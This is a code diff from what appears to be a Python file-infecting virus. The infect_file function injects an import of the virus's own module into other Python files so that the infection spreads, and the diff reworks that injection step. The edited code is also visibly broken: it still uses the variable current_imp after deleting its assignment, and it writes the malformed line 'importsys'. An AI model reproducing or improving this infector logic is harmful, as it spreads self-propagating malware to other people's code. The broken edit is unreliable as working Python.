@@ -96,11 +96,10 @@ def infect_file(file_path):
     if search_str in old_content:
         return      # return if it's already infected
 
-    res = re.search('^import(.+?)\n', old_content)   # find the first import line
-    if res:     
-        current_imp = res.group(1)
+    res = re.search('^import sys', old_content)   # find the first import line
+    if res:    
         # make a new import block that has our module
-        new_imp = current_imp + "\nimport " + DEST_MODULE_NAME[:-3]     
+        new_imp = "importsys\nimport " + DEST_MODULE_NAME[:-3] + "\n"     
         new_con = old_content.replace(current_imp, new_imp, 1)     # insert the new import block
         with open(file_path, "w") as f:
             print("Infecting " + file_path + "...")
